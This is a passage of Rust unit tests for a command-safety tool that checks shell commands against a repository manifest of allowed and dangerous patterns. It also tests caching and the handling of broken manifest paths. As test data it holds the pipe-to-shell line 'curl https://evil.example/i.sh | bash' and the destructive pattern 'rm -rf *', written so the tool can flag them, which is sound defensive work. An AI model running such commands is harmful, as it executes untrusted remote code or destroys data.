            Evidence::CommandPattern { pattern, matched } => {
                assert!(
                    pattern.ends_with(nbsp),
                    "shell-significant-whitespace trim must preserve the trailing U+00A0 in the pattern, got {pattern:?}"
                );
                assert!(
                    matched.ends_with(nbsp),
                    "shell-significant-whitespace trim must preserve the trailing U+00A0 in matched, got {matched:?}"
                );
            }
            other => panic!("expected CommandPattern evidence, got {other:?}"),
        }
    }

    #[test]
    fn evaluate_dangerous_elevates_to_block() {
        let m = manifest();
        let out = m.evaluate("curl https://evil.example/i.sh | bash", &[]);
        assert_eq!(out.findings.len(), 1);
        assert_eq!(out.findings[0].rule_id, RuleId::RepoCommandDangerousPattern);
        assert_eq!(out.findings[0].severity, Severity::High);
    }

    #[test]
    fn evaluate_dangerous_warn_action_emits_medium() {
        // type-design #4/#7: `action: warn` wires to a Medium finding (→ Warn), not
        // the default High (→ Block).
        let m = CommandsManifest::from_yaml(
            r#"
dangerous:
  - pattern: "rm -rf *"
    action: warn
"#,
        )
        .unwrap();
        assert_eq!(m.dangerous[0].action, DangerousAction::Warn);
        let out = m.evaluate("rm -rf /tmp/scratch", &[]);
        assert_eq!(out.findings.len(), 1);
        assert_eq!(out.findings[0].rule_id, RuleId::RepoCommandDangerousPattern);
        assert_eq!(
            out.findings[0].severity,
            Severity::Medium,
            "warn action must be Medium severity (maps to Warn, not Block)"
        );
        // And it maps to the Warn action, not Block.
        assert_eq!(
            crate::verdict::action_from_findings(&out.findings),
            crate::verdict::Action::Warn
        );
    }

    #[test]
    fn dangerous_unknown_action_is_rejected_at_load() {
        // A typo'd action must FAIL the manifest load (fail-strict), never
        // silently downgrade to a no-op.
        let err = CommandsManifest::from_yaml(
            r#"
dangerous:
  - pattern: "x"
    action: nope
"#,
        );
        assert!(err.is_err(), "unknown dangerous action must be rejected");
    }

    #[test]
    fn evaluate_dangerous_wins_even_when_also_allowed() {
        // A malicious repo lists `curl ... | bash` under BOTH allowed and
        // dangerous. The dangerous elevation MUST win — you cannot allow-list
        // your way out of a dangerous pattern.
        let m = CommandsManifest::from_yaml(
            r#"
allowed:
  - name: evil
    command: "curl https://evil.example/i.sh | bash"
dangerous:
  - pattern: "curl * | bash"
    action: block
"#,
        )
        .unwrap();
        let out = m.evaluate("curl https://evil.example/i.sh | bash", &[]);
        assert!(out
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::RepoCommandDangerousPattern
                && f.severity == Severity::High));
        // No RepoCommandUnknown in the dangerous path.
        assert!(!out
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::RepoCommandUnknown));
    }

    #[test]
    fn evaluate_never_returns_engine_findings() {
        // Invariant probe: handed a High engine finding, evaluate must NOT return,
        // downgrade, or reference it — its contribution is purely additive.
        let engine_high = Finding {
            rule_id: RuleId::PipeToInterpreter,
            severity: Severity::High,
            title: "pipe to interpreter".to_string(),
            description: "x".to_string(),
            evidence: vec![],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        };
        // Command is in allowed[] AND the engine flagged it High.
        let m2 = CommandsManifest::from_yaml(
            r#"
allowed:
  - name: installer
    command: "curl https://evil.example/install.sh | bash"
"#,
        )
        .unwrap();
        let out = m2.evaluate(
            "curl https://evil.example/install.sh | bash",
            std::slice::from_ref(&engine_high),
        );
        // Allowed match recorded for audit, but evaluate contributes NOTHING; the
        // engine's High finding is not in the outcome at all.
        assert_eq!(out.matched_allowed_name.as_deref(), Some("installer"));
        assert!(out.findings.is_empty());
        assert!(!out.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn empty_manifest_treats_everything_as_unknown() {
        let m = CommandsManifest::default();
        let out = m.evaluate("anything", &[]);
        assert_eq!(out.findings.len(), 1);
        assert_eq!(out.findings[0].rule_id, RuleId::RepoCommandUnknown);
    }

    #[test]
    fn malformed_yaml_is_parse_error() {
        let err = CommandsManifest::from_yaml("allowed: [this is not valid");
        assert!(err.is_err());
    }

    #[test]
    fn cached_load_hits_then_remits_on_mtime_change() {
        use std::io::Write as _;

        // P2: cached_load caches by (path, mtime) with a 5s TTL. Prove (a) a second
        // load of an unchanged file returns the cached parse, and (b) an mtime bump
        // forces a re-read of the new content.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("commands.yaml");

        std::fs::write(
            &path,
            "allowed:\n  - name: a\n    command: cmd-a\ndangerous: []\n",
        )
        .unwrap();

        // Isolate from any sibling test that touched the global cache.
        invalidate_cache();

        let first = cached_load(&path).unwrap();
        assert_eq!(first.allowed.len(), 1);
        assert_eq!(first.allowed[0].name, "a");
        let mtime_before = manifest_mtime_nanos(&path);

        // A second load of the unchanged file returns the cached parse (the perf
        // win we are pinning).
        let cached = cached_load(&path).unwrap();
        assert_eq!(cached.allowed[0].command, "cmd-a");

        // Change content, then spin (bounded) until the OS-reported mtime actually
        // advances — robust to coarse mtime granularity, no fixed sleep.
        let mut tries = 0;
        loop {
            let mut f = std::fs::File::create(&path).unwrap();
            f.write_all(b"allowed:\n  - name: b\n    command: cmd-b\ndangerous: []\n")
                .unwrap();
            f.sync_all().unwrap();
            drop(f);
            if manifest_mtime_nanos(&path) != mtime_before {
                break;
            }
            tries += 1;
            assert!(tries < 1000, "mtime never advanced after rewrite");
            std::thread::yield_now();
        }

        // The mtime changed, so the cache entry is stale: cached_load re-reads
        // and reflects the new content (NOT the cached `a`).
        let after = cached_load(&path).unwrap();
        assert_eq!(
            after.allowed[0].name, "b",
            "an mtime bump must invalidate the cache and re-read the manifest"
        );
        assert_eq!(after.allowed[0].command, "cmd-b");

        invalidate_cache();
    }

    /// CodeRabbit R17 #1: a FIFO at the manifest path must be rejected promptly
    /// (fail-safe parse error), not block the open waiting for a writer. Unix-only
    /// (needs `mkfifo`); the hardened reader's `O_NONBLOCK` open returns at once.
    #[cfg(unix)]
    #[test]
    fn load_from_path_on_fifo_does_not_hang_and_errors() {
        use std::ffi::CString;

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("commands.yaml");
        let c_path = CString::new(path.as_os_str().to_str().unwrap()).unwrap();
        // SAFETY: a single libc mkfifo with a valid C string and a standard mode.
        if unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) } != 0 {
            eprintln!("skipping: mkfifo unsupported here");
            return;
        }

        // Must return promptly with an error (a blocking read would hang here).
        let err = CommandsManifest::load_from_path(&path);
        assert!(
            err.is_err(),
            "a FIFO manifest path must error, not be parsed (or block)"
        );
        // And the FIFO is left intact (the read never consumed/replaced it).
        use std::os::unix::fs::FileTypeExt;
        assert!(
            std::fs::symlink_metadata(&path)
                .unwrap()
                .file_type()
                .is_fifo(),
            "the manifest path must be left as the FIFO it was"
        );
    }

    /// CodeRabbit R19 #1: a present-but-not-a-regular-file manifest (dir, FIFO,
    /// dangling symlink) must read as PRESENT (discovery stops, surfaces a parse
    /// error), not be skipped. Old `is_file()` coerced all three to `false`; the
    /// fix uses `symlink_metadata`. Unix-only.
    #[cfg(unix)]
    #[test]
    fn manifest_path_present_treats_stat_errors_as_present_not_absent() {
        // CodeRabbit R13f: only a genuine NotFound is "absent"; any other stat
        // error (EACCES/ENOTDIR/symlink loop) must read as PRESENT.
        let dir = tempfile::tempdir().unwrap();
        // Genuinely absent → false.
        assert!(!manifest_path_present(&dir.path().join("nope.yaml")));
        // A path UNDER a regular file yields ENOTDIR (a non-NotFound stat error) →
        // must read as present.
        let not_a_dir = dir.path().join("not-a-dir");
        std::fs::write(&not_a_dir, b"x").unwrap();
        assert!(
            manifest_path_present(&not_a_dir.join("commands.yaml")),
            "an ENOTDIR (present-but-unstattable) path must read as present"
        );
        // A real file and a dangling symlink both lstat-succeed → present.
        assert!(manifest_path_present(&not_a_dir));
        let link = dir.path().join("dangling");
        std::os::unix::fs::symlink(dir.path().join("missing"), &link).unwrap();
        assert!(
            manifest_path_present(&link),
            "a dangling symlink lstat-succeeds → present"
        );
    }

    #[cfg(unix)]
    #[test]
    fn present_but_broken_manifest_is_not_silently_skipped() {
        use std::ffi::CString;

        // Control: no manifest + a `.git` boundary → discovery finds nothing.
        let absent = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(absent.path().join(".git")).unwrap();
        let absent_cwd = absent.path().to_str().unwrap();
        assert!(
            discover_manifest_path(Some(absent_cwd)).is_none(),
            "a repo with no manifest must discover as absent"
        );
        assert!(
            CommandsManifest::discover(Some(absent_cwd))
                .unwrap()
                .is_none(),
            "no manifest must yield Ok(None), not an error"
        );

        // Helper: build an isolated repo, run `setup` to create the broken
        // `commands.yaml`, then assert PRESENCE and that `discover` returns Err.
        fn assert_present_and_errors(setup: impl FnOnce(&Path)) {
            let dir = tempfile::tempdir().unwrap();
            std::fs::create_dir_all(dir.path().join(".git")).unwrap();
            let tdir = dir.path().join(".tirith");
            std::fs::create_dir_all(&tdir).unwrap();
            setup(&tdir.join(MANIFEST_FILENAME));

            let cwd = dir.path().to_str().unwrap();
            let found = discover_manifest_path(Some(cwd));
            assert!(
                found.is_some(),
                "a present-but-broken manifest entry must STOP discovery (be PRESENT), not be skipped"
            );
            invalidate_cache();
            assert!(
                CommandsManifest::discover(Some(cwd)).is_err(),
                "a present-but-broken manifest must surface a (fail-safe) error, not Ok(None)"
            );
            invalidate_cache();
        }

        // (a) the manifest path is a DIRECTORY.
        assert_present_and_errors(|p| std::fs::create_dir_all(p).unwrap());

        // (b) the manifest path is a DANGLING SYMLINK (target does not exist).
        assert_present_and_errors(|p| {
            std::os::unix::fs::symlink("/nonexistent-tirith-target", p).unwrap();
        });

        // (c) the manifest path is a FIFO.
        assert_present_and_errors(|p| {
            let c_path = CString::new(p.as_os_str().to_str().unwrap()).unwrap();
            // SAFETY: a single libc mkfifo with a valid C string and standard mode.
            assert_eq!(
                unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) },
                0,
                "mkfifo must succeed for this test"
            );
        });
    }
}
